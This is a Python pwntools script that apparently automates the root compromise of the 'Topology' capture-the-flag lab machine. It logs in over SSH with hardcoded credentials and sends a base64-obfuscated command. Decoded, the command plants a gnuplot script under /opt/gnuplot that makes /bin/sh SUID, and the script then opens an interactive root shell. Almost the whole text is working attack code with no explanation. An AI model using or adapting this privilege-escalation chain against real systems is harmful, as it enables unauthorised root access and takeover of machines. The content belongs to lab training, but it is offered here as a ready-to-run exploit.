
import os

try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Topology ~ Ninhpn\n")
except:
    print("\n[\033[1;31m!\033[1;37m] Need root or pwntools\n")
    exit(1)

def kill(sig, frame):
    print("\n[\033[1;31m-\033[1;37m] Exit...\n")
    sys.exit(1)
root = b64d('ZWNobyAnc3lzdGVtICJjaG1vZCB1K3MgL2Jpbi9zaCInID4gL29wdC9nbnVwbG90L3Jvb3QucGx0')

tty = b64d('cHl0aG9uMyAtYyAiaW1wb3J0IHB0eTsgcHR5LnNwYXduKCcvYmluL2Jhc2gnKSI=')


try:
	print("\n[\033[1;31m-\033[1;37m] Trying SSH vdaisley...\n")
	request = ssh(host='10.10.11.217', user='vdaisley', password='calculus20')
	shell = request.process("/bin/sh")
	shell.sendline(root)
	print("\n[\033[1;31m-\033[1;37m] Wait to execute root... Timeout 10sec\n")
	time.sleep(10)
	shell.sendline(b"/bin/sh -P")
	time.sleep(0.3)
	print("\n[\033[1;31m-\033[1;37m] If the sh is not root, just wait a minute an execute /bin/sh -p \n")
	shell.interactive()

except:
	print("\n[\033[1;31m-\033[1;37m] .... How?\n")
